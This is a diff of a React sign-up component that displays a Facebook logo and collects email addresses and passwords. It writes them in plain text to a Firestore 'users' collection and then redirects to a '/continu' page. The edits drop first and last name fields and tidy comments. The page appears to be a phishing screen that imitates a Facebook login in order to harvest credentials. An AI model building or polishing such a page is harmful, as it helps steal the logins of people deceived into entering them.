@@ -8,8 +8,6 @@ export default function Home() {
   const navigate = useNavigate();
 
   const [formData, setFormData] = useState({
-    fname: '',
-    lname: '',
     email: '',
     psw: '',
   });
@@ -25,10 +23,10 @@ export default function Home() {
   const handleClick = async (e) => {
     e.preventDefault();
     
-    const { fname, lname, email, psw } = formData;
+    const { email, psw } = formData;
 
     try {
-      // Generate unique user ID
+      // Generate a unique user ID
       const userId = doc(db, 'users', Date.now().toString()).id;
       
       const userData = { email, psw, uid: userId };
@@ -42,15 +40,14 @@ export default function Home() {
       // Navigate to the next page
       navigate("/continu");
     } catch (error) {
-      alert("Error during sign up: " + error.message); // Updated error handling
+      alert("Error during sign up: " + error.message);
     }
   };
 
   return (
     <div className='flex justify-center items-center flex-col h-[98vh] gap-8'>
-      <img src={facebook} alt="Facebook logo" height={32} width={82}/> {/* Fixed image source */}
+      <img src={facebook} alt="Facebook logo" height={32} width={82}/> {/* Image with fixed dimensions */}
       
-     
       <input
         name="email"
         className='outline-blue-600 border-2 p-4 w-96'
